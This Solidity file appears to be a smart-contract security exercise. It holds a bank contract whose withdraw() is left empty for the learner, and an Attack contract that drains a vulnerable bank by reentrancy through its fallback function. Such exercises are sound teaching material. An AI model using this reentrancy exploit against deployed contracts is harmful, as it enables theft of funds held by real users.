// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract DecentralizedBanktoAttackFixChallenge {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // You can implement the withdraw() and related neccessary function here
    ////////////////////////////////////////////
    function withdraw() public {
        
    }

    ////////////////////////////////////////////

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    DecentralizedBanktoAttackFixChallenge
        public decentralizedBanktoAttackFixChallenge;

    constructor(address _decentralizedBanktoAttackAddress) {
        decentralizedBanktoAttackFixChallenge = DecentralizedBanktoAttackFixChallenge(
            _decentralizedBanktoAttackAddress
        );
    }

    fallback() external payable {
        if (address(decentralizedBanktoAttackFixChallenge).balance >= 1 ether) {
            decentralizedBanktoAttackFixChallenge.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        decentralizedBanktoAttackFixChallenge.deposit{value: 1 ether}();
        decentralizedBanktoAttackFixChallenge.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
